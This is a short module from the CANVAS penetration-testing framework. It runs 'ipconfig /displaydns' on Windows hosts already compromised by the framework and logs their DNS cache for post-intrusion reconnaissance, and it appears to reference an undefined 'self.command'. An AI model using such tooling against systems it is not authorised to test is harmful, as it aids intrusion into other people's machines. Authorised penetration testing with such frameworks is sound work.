#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

NAME                = "Get DNS Cache"
VERSION             = "1.0"
DESCRIPTION         = "Grab the local DNS cache from the compromised host, useful for backtracking any old queries."

DOCUMENTATION       = {}

PROPERTY            = {}
PROPERTY['TYPE']    = "Commands"
PROPERTY['SITE']    = "Local"
PROPERTY['ARCH']    = [ ["Windows"] ]

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result = ""
        self.name   = NAME

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))

        node        = self.argsDict["passednodes"][0]
        self.result = []

        for node in self.argsDict["passednodes"]:
            
            nodetype        = node.nodetype
            capabilities    = node.capabilities
            
            if node.nodetype in ["win32Node", "win64Node"]:
                command = "ipconfig /displaydns"
                output  = node.runcommand( command )
                self.log("DNS Cache Values: %s" % output)
                ret = 1
            else:
                self.log("The node named %s of type %s does not have the capabilities needed to run this command"%(node.get_name(),nodetype))
                self.result += [0]
                ret         = 0
                
        self.dispshellcmd = self.command
        self.setInfo("%s - (finished)" % (NAME))
        return ret

